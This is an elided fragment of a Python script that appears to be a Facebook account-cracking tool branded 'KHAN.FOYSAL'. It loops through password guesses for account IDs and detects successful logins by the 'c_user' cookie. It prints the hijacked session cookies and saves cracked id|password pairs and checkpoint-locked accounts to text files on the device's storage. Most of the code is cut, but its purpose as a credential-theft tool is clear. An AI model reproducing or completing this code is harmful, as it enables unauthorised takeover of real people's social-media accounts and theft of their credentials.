...
def ud():
    ...
    if opt == '1':
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100089742078475)
...
def o():
    ...
    if opt == '3':
        ...
        os.system('xdg-open https://youtube.com/@nfmission24')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;32m[KHAN.FOYSAL-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/KHAN.FOYSAL-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print('    \33[1;30m[KHAN.FOYSAL-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/KHAN.FOYSAL-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write(' %s[KHAN.FOYSAL] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
